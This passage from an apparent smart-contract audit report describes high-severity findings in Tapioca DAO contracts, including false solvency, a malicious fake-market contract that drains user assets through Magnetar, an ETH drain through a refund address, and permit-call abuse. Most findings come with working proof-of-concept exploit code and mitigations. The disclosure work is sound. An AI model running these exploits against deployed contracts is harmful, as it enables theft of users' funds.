https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/singularity/SGLLiquidation.sol#L80-L87
An user can borrow viaBigBang::borrowwhen there is no collateral amount from the user’s share. TheBigBangwill falsely consider the position as solvent, when it is not, resulting in a loss.
A similar issue presents in the Singularity asSGLLiquidation::_computeAssetAmountToSolvencywill overestimate the collateral, therefore liquidate less than it should.
Proof of Concept
The following proof of concept demonstrates that au user could borrow some assets, even though the collateral share will not give any amount of collateral.
Put the full PoC in the following gist intotest/bigBang.test.tsin tapiocabar-audit.
https://gist.github.com/zzzitron/14482ea3ab35b08421e7751bac0c2e3f
it('considers me solvent even when I have enough share for any amount PoCBorrow',async()=>{///////// setup is omitted// full poc is https://gist.github.com/zzzitron/14482ea3ab35b08421e7751bac0c2e3f///////constwethCollateralShare=ethers.BigNumber.from((1e8).toString()).sub(1);awaitwethBigBangMarket.addCollateral(deployer.address,deployer.address,false,0,wethCollateralShare,// valShare,);// logletuserCollateralShare=awaitwethBigBangMarket.userCollateralShare(deployer.address);console.log("userCollateralShare: ",userCollateralShare.toString());letuserCollateralShareToAmount=awaityieldBox.toAmount(wethAssetId,userCollateralShare,false);console.log("userCollateralShareToAmount: ",userCollateralShareToAmount.toString());letcollateralPartInAsset= (awaityieldBox.toAmount(wethAssetId,userCollateralShare.mul(1e13).mul(75000),false))console.log("collateralPart in asset times exchangerRate",collateralPartInAsset.toString())constexchangeRate=awaitwethBigBangMarket.exchangeRate();console.log("exchangeRate:",exchangeRate.toString());console.log("can borrow this much:",collateralPartInAsset.div(exchangeRate).toString());//borrow even though the collateral share is not enough for any amount of collateralconstusdoBorrowVal=collateralPartInAsset.div(exchangeRate).sub(1)awaitwethBigBangMarket.borrow(deployer.address,deployer.address,usdoBorrowVal,);letuserBorrowPart=awaitwethBigBangMarket.userBorrowPart(deployer.address,);expect(userBorrowPart.gt(0)).to.be.true;console.log(userBorrowPart.toString())});
The result of the test is:
BigBang testpocuserCollateralShare:  99999999userCollateralShareToAmount:  0collateralPart in asset times exchangerRate 749999992500000000exchangeRate: 1000000000000000can borrow this much: 749748✔ considers me solvent even when I have enough share for any amount PoCBorrow (12405ms)
In the scenario above, The deployer is adding share of collateral to the bigbang usingBigBang::addCollateral. The added amount in the below example is (1e8 - 1), which is too small to get any collateral from the YieldBox, as theyieldBox.toAmountis zero.
However, due to the calculation error in theMarket::_isSolvent, the deployer could borrow 748 of asset. Upon withdrawing the yieldBox will give zero amount of collateral, but the BigBang let the user borrow non zero amount of asset.
Similarly one can show thatSingularitywill liquidate less than it should, due to similar calculation error.
details of the bug
The problem stems from the calculation error, where multiplies the user’s collateral share withEXCHANGE_RATE_PRECISIONandcollateralizationRatebefore callingyieldBox.toAmount.
It will give inflated amount, resulting in false solvency.
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L415-L421
returnyieldBox.toAmount(collateralId,collateralShare*(EXCHANGE_RATE_PRECISION/FEE_PRECISION) *collateralizationRate,false) >=
The same calculation happens in theMarket::_computeMaxBorrowableAmount
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L385-L399
In the BigBang’s liquidating logic (e.i. in theBigBang::_updateBorrowAndCollateralShare), the conversion from the share of collateral to the asset is calculated correctly:
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L781-L785
uint256collateralPartInAsset= (yieldBox.toAmount(collateralId,userCollateralShare[user],false) *EXCHANGE_RATE_PRECISION) /_exchangeRate;
However, the position in question will not get to this logic, even ifBigBang::liquidateis called on the position, since the_isSolventwill falsely consider the position as solvent.
Similarly theSingularitywill overestimate the collateral in the same manner.
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/singularity/SGLLiquidation.sol#L70-L90
function_computeAssetAmountToSolvency(addressuser,uint256_exchangeRate)privateviewreturns(uint256) {// accrue must have already been called!uint256borrowPart=userBorrowPart[user];if(borrowPart==0)return0;uint256collateralShare=userCollateralShare[user];Rebasememory_totalBorrow=totalBorrow;uint256collateralAmountInAsset=yieldBox.toAmount(collateralId,(collateralShare*(EXCHANGE_RATE_PRECISION/FEE_PRECISION) *lqCollateralizationRate),false) /_exchangeRate;// Obviously it's not `borrowPart` anymore but `borrowAmount`borrowPart= (borrowPart*_totalBorrow.elastic) /_totalBorrow.base;
Recommended Mitigation Steps
TheMarket::_isSolventandMarket::_computeMaxBorrowableAmountshould evaluate the value of collateral likeBigBang::_updateBorrowAndCollateralSharefunction, (e.i. calculate the exchangeRate and collateralizationRate after converting the share to asset).
0xRektora (Tapioca) confirmed

[H-46] TOFT leverageDown always fails if TOFT is a wrapper for native tokens
Submitted bywindhustler
Pathway forsendForLeverage->leverageDownalways fails if theTapiocaOFTormTapiocaOFTholds the native token as underlying, i.e.erc20 == address(0).
This results in loss of gas, airdropped amount, and burned TOFT on the sending side for the user.
The failed message if retried will always fail and result in permanent loss for the user.
Proof of Concept
TapiocaOFT/mTapiocaOFT is deployed witherc20 being address(0)in case if it holds the native token as an underlying token.
However, it still allows anyone to execute thesendForLeveragewhich always results in reverts when receiving the message.
The revert happens atIERC20(erc20).approve(externalData.swapper, amount);sinceaddress(0)doesn’t have anapprovefunction.
The message if retried will just keep on reverting because of the same reason due to the way thefailedMessagesare stored, e.g. you can just retry the same exact payload.
This way anyone invoking this function will lose his TOFT tokens forever.
Recommended Mitigation Steps
DisablesendForLeveragefunction if theTapiocaOFTormTapiocaOFTholds the native token as underlying, e.g. revert on the sending side.
0xRektora (Tapioca) confirmed

[H-47] User’s assets can be stolen when removing them from the Singularity market through the Magnetar contract
Submitted by0xStalin, also found byAck
An Attacker can remove user’s assets from Singularity Markets and steal them to an account of his own by abusing a vulnerability present in the Magnetar contract
Proof of Concept
TheMagnetar::exitPositionAndRemoveCollateral()can be used to exit from  tOB, unlock from tOLP, remove assets from Singularity markets, repay on BigBang markets, remove collateral from BigBang markets and withdraw, each of these steps are optional.When users wants to execute any operation through the Magnetar contract, the Magnetar contracts requires to have the user’s approvals/permissions, that means, when the Magnetar contract executes something on behalf of the user, the Magnetar contract have already been granted permission/allowance on the called contract on the user’s behalf.When using the Magnetar contract to remove user assets from the Singularity market and use those assets to repay in a BigBang contract, the Magnetar contract will receive the removed assets from the Singularity Market, grant ALL allowance to the BigBang contract in the YieldBox, and finally will call the BigBang.repay().The problem is that none of the two markets are checked to ensure that they are valid and supported contracts by the Protocol.This attack requires that an attacker creates a FakeBigBang contract (see Step 2 of the Coded PoC mini section!), and passes the address of this Fake BigBang contract as the address of the BigBang where the repayment will be done.When the execution is forwarded to the FakeBigBang contract, the Magnetar contract had already granted ALL allowance to this Fake contract in the YieldBox, which makes possible to do aYieldBox.transfer()from the Magnetar contract to an account owned by the attacker.The transferred assets from the Magnetar contract are the assets of the user that were removed from the Singularity market and that they were supposed to be used to repay the user’s debt on the BigBang contract
Coded PoC
I coded a PoC using themagnetar.test.tsfile as the base for this PoC.The first step is to add theattackeraccount in thetest.utils.tsfile
> git diff --no-index test.utils.ts testPoC.utils.tsdiff --git a/test.utils.ts b/testPoC.utils.tsindex 00fc388..83107e6 100755--- a/test.utils.ts+++ b/testPoC.utils.ts@@ -1023,8 +1023,14 @@ export async function register(staging?: boolean) {ethers.provider,);+    const attacker = new ethers.Wallet(+        ethers.Wallet.createRandom().privateKey,+        ethers.provider,+    );+if (!staging) {await setBalance(eoa1.address, 100000);+        await setBalance(attacker.address, 100000);}// ------------------- Deploy WethUSDC mock oracle -------------------@@ -1314,6 +1320,7 @@ export async function register(staging?: boolean) {if (!staging) {await setBalance(eoa1.address, 100000);+        await setBalance(attacker.address, 100000);}const initialSetup = {@@ -1341,6 +1348,7 @@ export async function register(staging?: boolean) {_sglLeverageModule,magnetar,eoa1,+        attacker,multiSwapper,singularityFeeTo,liquidationQueue,
Now, let’s create theFakeBigBangcontract, make sure to create it under thetapioca-periph-audit/contract/folder
// SPDX-License-Identifier: MITpragmasolidity^0.8.0;// import "@boringcrypto/boring-solidity/contracts/libraries/BoringRebase.sol";//YIELDBOXimport"tapioca-sdk/dist/contracts/YieldBox/contracts/YieldBox.sol";import"./interfaces/IYieldBoxBase.sol";import"./interfaces/IMarket.sol";contractFakeBigBang{// using RebaseLibrary for Rebase;IMarketrealSingularityMarket;IYieldBoxBasepublicyieldBox;/// @notice collateral token addressaddresspubliccollateral;/// @notice collateral token YieldBox iduint256publiccollateralId;/// @notice asset token addressaddresspublicasset;/// @notice asset token YieldBox iduint256publicassetId;uint256publictOLPSglAssetId;addressmagnetarContract;functionsetMarket(address_realSingularityMarket)external{realSingularityMarket=IMarket(_realSingularityMarket);collateral=realSingularityMarket.collateral();collateralId=realSingularityMarket.collateralId();asset=realSingularityMarket.asset();assetId=realSingularityMarket.assetId();yieldBox=IYieldBoxBase(realSingularityMarket.yieldBox());}functionsetMagnetar(address_magnetar)external{magnetarContract=_magnetar;}//@audit => This is the function that will be called by the Magnetar contract//@audit => This contract will be granted all permission over the Mangetar contract in the YieldBox, which will allow it to transfer all that Magnetar owns to any address//@audit-info => repay() will transfer the singularity.assetId() from the YieldBox!functionrepay(addressfrom,addressto,boolskim,uint256part)externalreturns(uint256amount) {uintmagnetarAssetBalance=yieldBox.balanceOf(magnetarContract,assetId);yieldBox.transfer(magnetarContract,address(this),assetId,magnetarAssetBalance);amount=type(uint256).max;}}
Create a new file to reproduce this PoC, magnetarremoveassetsfromsingularity_PoC.test.tsMake sure to create this new test file under thetapioca-periph-audit/test/folder
import { expect } from 'chai';import hre, { ethers, config } from 'hardhat';import { BN, register, getSGLPermitSignature } from './test.utils';import {loadFixture,takeSnapshot,} from '@nomicfoundation/hardhat-network-helpers';describe('MagnetarV2', () => {describe('repay', () => {it('should remove asset from Singularity and Attacker will steal those assets', async () => {const {weth,createWethUsd0Singularity,wethBigBangMarket,usd0,usdc,bar,wethAssetId,mediumRiskMC,deployCurveStableToUsdoBidder,initContracts,yieldBox,magnetar,deployer,attacker,} = await loadFixture(register);await initContracts();const usdoStratregy = await bar.emptyStrategies(usd0.address);const usdoAssetId = await yieldBox.ids(1,usd0.address,usdoStratregy,0,);const { stableToUsdoBidder } = await deployCurveStableToUsdoBidder(deployer,bar,usdc,usd0,false,);const { wethUsdoSingularity } = await createWethUsd0Singularity(deployer,usd0,weth,bar,usdoAssetId,wethAssetId,mediumRiskMC,yieldBox,stableToUsdoBidder,ethers.utils.parseEther('1'),false,);//@audit => Attacker deploys the FakeBigBang contract!const fakeBigBang = await ethers.deployContract("FakeBigBang");await fakeBigBang.setMarket(wethUsdoSingularity.address);await fakeBigBang.setMagnetar(magnetar.address);const borrowAmount = ethers.BigNumber.from((1e18).toString()).mul(100,);const wethMintVal = ethers.BigNumber.from((1e18).toString()).mul(10,);await usd0.mint(deployer.address, borrowAmount.mul(2));// We get assetawait weth.freeMint(wethMintVal);// Approve tokens// await approveTokensAndSetBarApproval();await yieldBox.setApprovalForAll(wethUsdoSingularity.address, true);await wethBigBangMarket.updateOperator(magnetar.address, true);await weth.approve(magnetar.address, wethMintVal);await wethUsdoSingularity.approve(magnetar.address,ethers.constants.MaxUint256,);await wethBigBangMarket.approveBorrow(magnetar.address,ethers.constants.MaxUint256,);await magnetar.mintFromBBAndLendOnSGL(deployer.address,borrowAmount,{mint: true,mintAmount: borrowAmount,collateralDepositData: {deposit: true,amount: wethMintVal,extractFromSender: true,},},{deposit: false,amount: 0,extractFromSender: false,},{lock: false,amount: 0,lockDuration: 0,target: ethers.constants.AddressZero,fraction: 0,},{participate: false,target: ethers.constants.AddressZero,tOLPTokenId: 0,},{singularity: wethUsdoSingularity.address,magnetar: magnetar.address,bigBang: wethBigBangMarket.address,},);await usd0.approve(yieldBox.address, ethers.constants.MaxUint256);await yieldBox.depositAsset(usdoAssetId,deployer.address,deployer.address,borrowAmount,0,);const wethCollateralBefore =await wethBigBangMarket.userCollateralShare(deployer.address);const fraction = await wethUsdoSingularity.balanceOf(deployer.address,);const assetId = await wethUsdoSingularity.assetId();console.log("asset in YieldBox owned by Magnetar - BEFORE: ", await yieldBox.balanceOf(magnetar.address,assetId));console.log("asset in YieldBox owned by User - BEFORE: ", await yieldBox.balanceOf(deployer.address,assetId));console.log("asset in YieldBox owned by FakeBigBang - BEFORE: ", await yieldBox.balanceOf(fakeBigBang.address,assetId));//@audit => magnetar contract already has been approved by the deployer contract to perform the removed asset operation in the Singularity Market//@audit => The `attacker` executed the attack over the `deployer` address//@audit => attacker will remove assets from the deployer in the Singularity market, and will transfer those assets to an account of his own by using a FakeBigBang contract!await magnetar.connect(attacker).exitPositionAndRemoveCollateral(deployer.address,{magnetar: magnetar.address,singularity: wethUsdoSingularity.address,// bigBang: wethBigBangMarket.address,bigBang: fakeBigBang.address,},{removeAssetFromSGL: true,removeShare: fraction.div(2),repayAssetOnBB: true,repayAmount: await yieldBox.toAmount(usdoAssetId,fraction.div(3),false,),removeCollateralFromBB: false,collateralShare: 0,exitData: {exit: false,oTAPTokenID: 0,target: ethers.constants.AddressZero,},unlockData: {unlock: false,target: ethers.constants.AddressZero,tokenId: 0,},assetWithdrawData: {withdraw: false,withdrawAdapterParams: ethers.utils.toUtf8Bytes(''),withdrawLzChainId: 0,withdrawLzFeeAmount: 0,withdrawOnOtherChain: false,},collateralWithdrawData: {withdraw: false,withdrawAdapterParams: ethers.utils.toUtf8Bytes(''),withdrawLzChainId: 0,withdrawLzFeeAmount: 0,withdrawOnOtherChain: false,},},);console.log("\n\n=======================================================================\n\n");console.log("asset in YieldBox owned by Magnetar - AFTER: ", await yieldBox.balanceOf(magnetar.address,assetId));console.log("asset in YieldBox owned by User - AFTER: ", await yieldBox.balanceOf(deployer.address,assetId));console.log("asset in YieldBox owned by FakeBigBang - AFTER: ", await yieldBox.balanceOf(fakeBigBang.address,assetId));});});});
After all the 3 previous steps have been completed, everything is ready to run the PoC.
npx hardhat test magnetarremoveassetsfromsingularity_PoC.test.ts
MagnetarV2repayasset in YieldBox owned by Magnetar - BEFORE:  BigNumber { value: "0" }asset in YieldBox owned by User - BEFORE:  BigNumber { value: "10000000000000000000000000000" }asset in YieldBox owned by FakeBigBang - BEFORE:  BigNumber { value: "0" }=======================================================================asset in YieldBox owned by Magnetar - AFTER:  BigNumber { value: "0" }asset in YieldBox owned by User - AFTER:  BigNumber { value: "10000000000000000000000000000" }asset in YieldBox owned by FakeBigBang - AFTER:  BigNumber { value: "5000000000000000000000000000" }✔ should remove asset from Singularity and Attacker will steal those assets (14114ms)
Recommended Mitigation Steps
Use the Penrose contract to validate that the provided markets as parameters are real markets supported by the protocol (Both, BB & Singularity markets)Add the below checks on the_exitPositionAndRemoveCollateral()function
function_exitPositionAndRemoveCollateral(addressuser,ICommonData.ICommonExternalContractscalldataexternalData,IUSDOBase.IRemoveAndRepaycalldataremoveAndRepayData)private{+require(penrose.isMarketRegistered(externalData.bigBang),"BigBang market is not a valid market supported by the protocol");+require(penrose.isMarketRegistered(externalData.singularity),"Singularity market is not a valid market supported by the protocol");IMarketbigBang=IMarket(externalData.bigBang);ISingularitysingularity=ISingularity(externalData.singularity);IYieldBoxBaseyieldBox=IYieldBoxBase(singularity.yieldBox());.........}
0xRektora (Tapioca) confirmed

[H-48] triggerSendFrom() will send all the ETH in the destination chain where sendFrom() is called to the refundAddress in the LzCallParams argument
Submitted by0x73696d616f
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/BaseTOFT.sol#L99
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/BaseTOFT.sol#L551
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L142
https://github.com/Tapioca-DAO/tapioca-sdk-audit/blob/90d1e8a16ebe278e86720bc9b69596f74320e749/src/contracts/token/oft/v2/BaseOFTV2.sol#L18
All the ETH in the destination chain wheresendFrom()is called is sent to therefundAddressin theLzCallParams. Thus, forTapiocaOFTs which have ETH as the underlying asseterc, all the funds will be lost if therefundAddressis an address other than theTapiocaOFT.
Proof of Concept
sendFrom()uses themsg.valueas native fees to LayerZero, being the excess sent refunded to therefundAddress. InBaseTOFTOptionsModule,sendFromDestination(), which is called when there was atriggerSendFrom()from a source chain which is delivered to the current chain, the value sent to thesendFrom()function isaddress(this).balance:
function sendFromDestination(bytes memory _payload) public {...ISendFrom(address(this)).sendFrom{value: address(this).balance}(from,lzDstChainId,LzLib.addressToBytes32(from),amount,callParams);...}
This means that all the balance but the LayerZero message fee will be refunded to therefundAddressin thecallParams, as can be seen in thesendFrom()function:
functionsendFrom(address_from,uint16_dstChainId,bytes32_toAddress,uint_amount,LzCallParamscalldata_callParams)publicpayablevirtualoverride{_send(_from,_dstChainId,_toAddress,_amount,_callParams.refundAddress,_callParams.zroPaymentAddress,_callParams.adapterParams);}
The following POC shows that a user that specifies therefundAddressas its address will receive all the ETH balance in theTapiocaOFTcontract minus the LayerZero message fee.
// SPDX-License-Identifier: UNLICENSEDpragmasolidity^0.8.18;import{Test,console}from"forge-std/Test.sol";import{TapiocaOFT}from"contracts/tOFT/TapiocaOFT.sol";import{BaseTOFTOptionsModule}from"contracts/tOFT/modules/BaseTOFTOptionsModule.sol";import{IYieldBoxBase}from"tapioca-periph/contracts/interfaces/IYieldBoxBase.sol";import{ISendFrom}from"tapioca-periph/contracts/interfaces/ISendFrom.sol";import{ICommonData}from"tapioca-periph/contracts/interfaces/ICommonData.sol";contractTapiocaOFTPOCisTest{addresspublicconstantLZ_ENDPOINT=0x66A71Dcef29A0fFBDBE3c6a460a3B5BC225Cd675;uint16publicconstantPT_SEND_FROM=778;functiontest_POC_TriggerSendFrom_StealAllEth()public{vm.createSelectFork("https://eth.llamarpc.com");addressoptionsModule_=address(newBaseTOFTOptionsModule(address(LZ_ENDPOINT),address(0),IYieldBoxBase(address(2)),"SomeName","SomeSymbol",18,block.chainid));TapiocaOFTtapiocaOft_=newTapiocaOFT(LZ_ENDPOINT,address(0),IYieldBoxBase(address(3)),"SomeName","SomeSymbol",18,block.chainid,payable(address(1)),payable(address(2)),payable(address(3)),payable(optionsModule_));addressuser_=makeAddr("user");deal(user_,2ether);deal(address(tapiocaOft_),10ether);vm.prank(user_);tapiocaOft_.wrap{value:1ether}(user_,user_,1ether);uint16lzDstChainId_=102;bytesmemoryairdropAdapterParams_;addresszroPaymentAddress_=address(0);uint256amount_=1;ISendFrom.LzCallParamsmemorysendFromData_;sendFromData_.refundAddress=payable(user_);ICommonData.IApproval[]memoryapprovals_;tapiocaOft_.setTrustedRemoteAddress(102,abi.encodePacked(tapiocaOft_));// triggerSendFrom goes through with refundAddress = user_ in the SendFrom call in the destination chainvm.prank(user_);tapiocaOft_.triggerSendFrom{value:1ether}(lzDstChainId_,airdropAdapterParams_,zroPaymentAddress_,amount_,sendFromData_,approvals_);bytesmemorylzPayload_=abi.encode(PT_SEND_FROM,user_,amount_,sendFromData_,102,approvals_);vm.prank(user_);tapiocaOft_.approve(address(tapiocaOft_),amount_);// user has to approve the tOFT contract to spend their tokens in the SendFrom callvm.prank(LZ_ENDPOINT);tapiocaOft_.lzReceive(102,abi.encodePacked(tapiocaOft_,tapiocaOft_),0,lzPayload_);assertGt(user_.balance,10ether);// user received the whole balance of the tOFT contract due to the refund}}
Tools Used
Vscode, Foundry
Recommended Mitigation Steps
The value sent in thesendFrom()call in theBaseTOFTOptionsModuleshould be sent and forwarded from thetriggerSendFrom()call in the source chain. This way, the user pays the fees from the source chain.
0xRektora (Tapioca) confirmed and commented:
Good finding. Technically speaking thesendFrom()will fail if the call was made to the host chain, the one holding the Ether, since LZ have a limit to the amount of value you can send between chain, but nonetheless valid.
LSDan (Judge) decreased severity to Medium
0x73696d616f (Warden) commented:
Hi everyone,This issue should be a valid high as there is no limit on the ETH transferred.
The ETH is sent to the attacker (or normal user) on the refund of the LayerZero UltraLightNodeV2,here, in the source chain wheresendFrom()is called, not in the destination chain.
The only cross chain transaction required for this exploit is thetriggerSendFrom(), which sends no ETH to the chain wheresendFrom()is called.
Thus, the ETH is not actually sent as a cross chain transaction, but sent directly as a refund in the source chain (see the test in the POC) wheresendFrom()is called, not having any limit.Kindly request a review from the judge.
LSDan (Judge) increase severity to High and commented:
Thank you for the clarification. You are correct. This is a valid high risk issue.

[H-49] User can give himself approval for all assets held byMagnetarV2contract
Submitted by0xTheC0der, also found byAckanddirk_y
When callingMagnetarV2._permit(…)through invoking a permit (or permit all) action viaMagnetarV2.burst(…), one can also execute other calls thanERC20.permit(...)due to the following reasons / under the following constraints:
Thetargetaddress can be chosen freely, can be any contract, asset, token, NFT, etc.The function selector inactionCalldatais not checked, i.e. not required to beERC20.permit(...)The first parameter in the encodedactionCalldatamustbe equal tomsg.senderThe length of theactionCalldatashould match the length of an encoded call toERC20.permit(...)to avoid issues onabi.decode(...)
Given this information, an attacker can easily craft calls to give him approval for any assets held by theMagnetarV2contract or directly invoke a transfer. There are potentially other malicious calls that can be crafted and executed via the permit action, therefore the mentioned approve/transfer calls are only an example.
In order for this to cause loss of funds for the DAO, theMagnetarV2contract needs to hold (be the owner of) assets in the first place which seems likely since it is a main entry point and interacts with other important parts of the protocol like Singularity, BigBang, TapiocaOptionBroker and MagnetarMarketModule(troughdelegatecallin some cases).
Proof of Concept
The following PoC is based on an existing test case and demonstrates that an attacker can give himself the approval of theMagnetarV2contract for an ERC20 token.
Just apply thediffbelow intapioca-periph-auditand run the test case withnpx hardhat test test/magnetar.test.ts:
diff --git a/test/magnetar.test.ts b/test/magnetar.test.tsindex 63d108e..f32659d 100644--- a/test/magnetar.test.ts+++ b/test/magnetar.test.ts@@ -439,7 +439,7 @@ describe('MagnetarV2', () => {});describe('permits', () => {-        it('should test an array of permits', async () => {+        it.only('approve via permit action', async () => {const { deployer, eoa1, magnetar } = await loadFixture(register);const name = 'Token One';@@ -486,39 +486,38 @@ describe('MagnetarV2', () => {);const signature = signTypedMessage(privateKey, { data });const { v, r, s } = fromRpcSig(signature);-++            // Original permit calldata: user/deployer gives approval about value to eo1const permitEncodedFnData = tokenOne.interface.encodeFunctionData('permit',[deployer.address, eoa1.address, value, MAX_DEADLINE, v, r, s],);++            // Crafted approve calldata: magnetar gives approval about value to user/deployer+            const approveEncodedFnData = tokenOne.interface.encodeFunctionData(+                'approve',+                [deployer.address, value],+            );++            // Pad approve calldata to length of permit calldata, otherwise magnetar reverts when decoding+            const approveEncodedFnDataPadded = approveEncodedFnData.padEnd(permitEncodedFnData.length, '0');await magnetar.connect(deployer).burst([{-                    id: 2,+                    id: 2,      // PERMITtarget: tokenOne.address,value: 0,allowFailure: false,-                    call: permitEncodedFnData,+                    call: approveEncodedFnDataPadded, // provide padded approval calldata},]);+            // Check if approval was successfulconst allowance = await tokenOne.allowance(+                magnetar.address,deployer.address,-                eoa1.address,);expect(allowance.eq(value)).to.be.true;--            await expect(-                magnetar.connect(deployer).burst([-                    {-                        id: 2,-                        target: tokenOne.address,-                        value: 0,-                        allowFailure: false,-                        call: permitEncodedFnData,-                    },-                ]),-            ).to.be.reverted;});});
Tools Used
VS Code, Hardhat
Recommended Mitigation Steps
Require the function selector (first 4 bytes ofactionCalldata) to match anERC*.permit(...)call inMagnetarV2._permit(…).
0xRektora (Tapioca) confirmed

[H-50] CompoundStrategy attempts to transfer out a greater amount of ETH than will actually be withdrawn, leading to DoS
Submitted bykaden
Withdrawals will revert whenever there is not sufficient wrapped native tokens to cover loss from integer truncation.
Proof of Concept
CompoundStrategy._withdrawcalculates the amount of cETH to redeem withcToken.exchangeRateStoredbased on a provided amount of ETH to receive from the withdrawal.
function_withdraw(addressto,uint256amount)internaloverridenonReentrant{uint256available=_currentBalance();require(available>=amount,"CompoundStrategy: amount not valid");uint256queued=wrappedNative.balanceOf(address(this));if(amount>queued) {uint256pricePerShare=cToken.exchangeRateStored();uint256toWithdraw= (((amount-queued) * (10**18)) /pricePerShare);cToken.redeem(toWithdraw);
To understand the vulnerability, we look at theCEthercontract which we are attempting to withdraw from.
/***@noticeSender redeems cTokens in exchange for the underlying asset*@devAccrues interest whether or not the operation succeeds, unless reverted*@paramredeemTokensThe number of cTokens to redeem into underlying*@returnuint 0=success, otherwise a failure (see ErrorReporter.sol for details)*/functionredeem(uintredeemTokens)externalreturns(uint) {returnredeemInternal(redeemTokens);}
redeemreturns the result fromredeemInternal
/***@noticeSender redeems cTokens in exchange for the underlying asset*@devAccrues interest whether or not the operation succeeds, unless reverted*@paramredeemTokensThe number of cTokens to redeem into underlying*@returnuint 0=success, otherwise a failure (see ErrorReporter.sol for details)*/functionredeemInternal(uintredeemTokens)internalnonReentrantreturns(uint) {uinterror=accrueInterest();if(error!=uint(Error.NO_ERROR)) {// accrueInterest emits logs on errors, but we still want to log the fact that an attempted redeem failedreturnfail(Error(error),FailureInfo.REDEEM_ACCRUE_INTEREST_FAILED);}// redeemFresh emits redeem-specific logs on errors, so we don't need toreturnredeemFresh(msg.sender,redeemTokens,0);}
After accruing interest and checking for errors,redeemInternalreturns the result fromredeemFreshwith the amount of tokens to redeem passed as the second param.
functionredeemFresh(addresspayableredeemer,uintredeemTokensIn,uintredeemAmountIn)internalreturns(uint) {.../* exchangeRate = invoke Exchange Rate Stored() */(vars.mathErr,vars.exchangeRateMantissa) =exchangeRateStoredInternal();.../* If redeemTokensIn > 0: */if(redeemTokensIn>0) {/** We calculate the exchange rate and the amount of underlying to be redeemed:*  redeemTokens = redeemTokensIn*  redeemAmount = redeemTokensIn x exchangeRateCurrent*/vars.redeemTokens=redeemTokensIn;(vars.mathErr,vars.redeemAmount) =mulScalarTruncate(Exp({mantissa:vars.exchangeRateMantissa}),redeemTokensIn);if(vars.mathErr!=MathError.NO_ERROR) {returnfailOpaque(Error.MATH_ERROR,FailureInfo.REDEEM_EXCHANGE_TOKENS_CALCULATION_FAILED,uint(vars.mathErr));}...vars.err=doTransferOut(redeemer,vars.redeemAmount);...}
redeemFreshretrieves the exchange rate (the same one thatCompoundStrategy._withdrawuses to calculate the amount to redeem), and uses it to calculatevars.redeemAmountwhich is later transferred to theredeemer. This is the amount of underlying ETH that we are redeeming theCEthertokens for.
We can carefully copy over the logic used inCEtherto calculate the amount of underlying ETH to receive, as well as the logic used inCompoundStrategy._withdrawto determine how manyCEtherto redeem for the desired output amount of underlying ETH, creating the following test contract in Remix.
pragma solidity 0.8.19;contract MatchCalcs {uint constant expScale = 1e18;struct Exp {uint mantissa;}function mulScalarTruncate(Exp memory a, uint scalar) pure external returns (uint) {return truncate(mulScalar(a, scalar));}function mulScalar(Exp memory a, uint scalar) pure internal returns (Exp memory) {uint256 scaledMantissa = mulUInt(a.mantissa, scalar);return Exp({mantissa: scaledMantissa});}function mulUInt(uint a, uint b) internal pure returns (uint) {if (a == 0) {return 0;}uint c = a * b;if (c / a != b) {return 0;} else {return c;}}function truncate(Exp memory exp) pure internal returns (uint) {// Note: We are not using careful math here as we're performing a division that cannot failreturn exp.mantissa / expScale;}function getToWithdraw(uint256 amount, uint256 exchangeRate) pure external returns (uint) {return amount * (10 ** 18) / exchangeRate;}}
We run the following example with the currentexchangeRateStored(at the time of writing) of200877136531571418792530957and an output amount of underlying ETH to receive of 1e18 on the functiongetToWithdraw, receiving an output of4978167337CEther. This is the amount ofCEtherthat would be passed toCEther.redeem.
Next we can see the output amount of underlying ETH according toCEthers logic. We pass the sameexchangeRateStoredvalue and the amount ofCEtherto redeem:4978167337, receiving an output amount of999999999831558306, less than the intended amount of 1e18.
Since we receive less than intended to receive fromCEther.redeem, the_withdrawcall likely fails at the following check:
require(wrappedNative.balanceOf(address(this)) >=amount,"CompoundStrategy: not enough");
Recommended Mitigation Steps
Rather than computing an amount ofCEtherto redeem, we can instead use theCEther.redeemUnderlyingfunction to receive our intended amount of underlying ETH.
cryptotechmaker (Tapioca) confirmed

[H-51] Funds are locked because borrowFee is not correctly implemented in BigBang
Submitted by0x007, also found byKoolex,0xrugpull_detector,0xnev, andSaeedAlipoor01988
There’s borrowOpeningFee for markets. In Singularity, this fee is accumulated over assets as a reward to asset depositors. In BigBang, assets is USD0 which would be minted and burned on borrow, and repay respectively. BigBang does not collect fees, because it uses the same mechanism as Singularity and therefore it would demand more than minted amount from user when it’s time to repay.
This results in a bird and egg situation where Users can’t fully repay a borrowed amount unless they borrow even more.
Proof of Concept
Let’s look at howborrowworks
function_borrow(addressfrom,addressto,uint256amount)internalreturns(uint256part,uint256share) {uint256feeAmount= (amount*borrowOpeningFee) /FEE_PRECISION;// A flat % fee is charged for any borrow(totalBorrow,part) =totalBorrow.add(amount+feeAmount,true);require(totalBorrowCap==0||totalBorrow.elastic<=totalBorrowCap,"BigBang: borrow cap reached");userBorrowPart[from] +=part;//mint USDOIUSDOBase(address(asset)).mint(address(this),amount);//deposit borrowed amount to userasset.approve(address(yieldBox),amount);yieldBox.depositAsset(assetId,address(this),to,amount,0);share=yieldBox.toShare(assetId,amount,false);emitLogBorrow(from,to,amount,feeAmount,part);}
As can be seen above, amount would be minted to user, but the userBorrowPart isamount + fee. When it’s time to repay, user have to returnamount + feein other to get all their collateral.
